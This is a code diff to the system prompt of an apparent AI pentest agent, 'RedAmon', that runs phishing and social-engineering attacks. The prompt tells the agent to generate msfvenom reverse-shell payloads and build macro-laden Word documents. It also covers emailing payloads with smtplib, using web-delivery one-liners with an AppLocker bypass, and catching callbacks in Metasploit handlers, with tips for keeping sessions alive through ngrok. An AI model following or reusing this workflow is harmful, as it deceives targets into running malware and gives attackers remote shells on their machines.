@@ -17,8 +17,7 @@ PHISHING_SOCIAL_ENGINEERING_TOOLS = """
 **You MUST use the social engineering workflow below.**
 
 Focus on generating payloads, malicious documents, or web delivery mechanisms
-and delivering them to the target. Do NOT switch to CVE exploitation or brute force
-unless the user explicitly requests it.
+and delivering them to the target. Do NOT switch to other attack chain unless the user explicitly requests it.
 
 ---
 
@@ -42,6 +41,12 @@ then follow the corresponding sub-workflow.
 ### Step 2: Set Up the Handler (ALWAYS — do this FIRST or IN PARALLEL)
 
 **The handler catches the callback when the target executes the payload.**
+
+**CRITICAL: ALWAYS use Metasploit `exploit/multi/handler` via the `metasploit_console` tool.**
+**NEVER use `nc`, `ncat`, `netcat`, or `socat` as a listener — even for plain shell payloads like `cmd/unix/reverse_bash`.**
+**Only Metasploit handlers create tracked sessions that appear in the RedAmon Remote Shells UI.**
+**A plain netcat listener will catch the shell but RedAmon cannot detect, display, or interact with it.**
+**If `metasploit_console` is not available in your current phase, request a phase transition to exploitation BEFORE setting up the handler.**
 
 Read "Pre-Configured Payload Settings" section (if present above) FIRST.
 It tells you whether to use REVERSE or BIND mode. Follow ONLY that mode's setup.
@@ -76,7 +81,7 @@ kali_shell: "msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -f <format> -o /t
 
 **Payload + Format Selection Matrix:**
 
-**⚠️ CRITICAL — CHECK "Pre-Configured Payload Settings" ABOVE BEFORE CHOOSING A PAYLOAD!**
+**CRITICAL — CHECK "Pre-Configured Payload Settings" ABOVE BEFORE CHOOSING A PAYLOAD!**
 **If ngrok is ACTIVE, you MUST use the STAGELESS column (underscore `_`) instead of the default STAGED column (slash `/`).**
 **Staged payloads SILENTLY FAIL through ngrok — the stage transfer gets corrupted and the session dies instantly.**
 
@@ -119,7 +124,7 @@ kali_shell: "ls -la /tmp/payload.exe && file /tmp/payload.exe"
 
 Use Metasploit fileformat modules to generate weaponized documents.
 
-**⚠️ ngrok note:** If ngrok is active (check "Pre-Configured Payload Settings" above), replace
+**ngrok note:** If ngrok is active (check "Pre-Configured Payload Settings" above), replace
 `windows/meterpreter/reverse_tcp` with `windows/meterpreter_reverse_tcp` in ALL commands below.
 
 **B1: Word Document with VBA Macro**
@@ -229,21 +234,6 @@ Use `execute_code` with Python `smtplib` to send the payload/document as an emai
 #### Web Delivery Link (Method C & D)
 Report the one-liner command (Method C) or URL (Method D) to the user.
 
-### Step 6: Wait for Callback and Verify Session
-
-After delivery, check if a session was established:
-```
-metasploit_console: "sessions -l"
-```
-
-**If session opens:** Request transition to `post_exploitation` phase.
-
-**If no session after reasonable wait:**
-- Verify handler is still running: `jobs` in metasploit_console
-- Verify payload matches handler: same payload type, LHOST, LPORT
-- Try a different payload format if the target platform was guessed wrong
-- Use `action="ask_user"` to ask if the target has executed the payload
-
 ---
 
 ## TROUBLESHOOTING
@@ -257,6 +247,7 @@ metasploit_console: "sessions -l"
 | Session opens then dies instantly (ngrok) | You are using a STAGED payload — switch to STAGELESS (e.g. `meterpreter_reverse_tcp` not `meterpreter/reverse_tcp`). |
 | "Payload is too large" | Use staged payload (e.g., `reverse_tcp` not `reverse_tcp_rc4`) or different encoder. |
 | Web delivery one-liner blocked | Try different TARGET (Regsvr32=3 for AppLocker bypass). |
+| No session appears in RedAmon UI | You used `nc`/`netcat`/`socat` instead of Metasploit `exploit/multi/handler`. Kill the netcat listener and set up a proper handler via `metasploit_console`. Only Metasploit sessions are tracked by RedAmon. |
 | **Same approach fails 3+ times** | **STOP. Use action="ask_user" to discuss alternative approaches.** |
 """
 
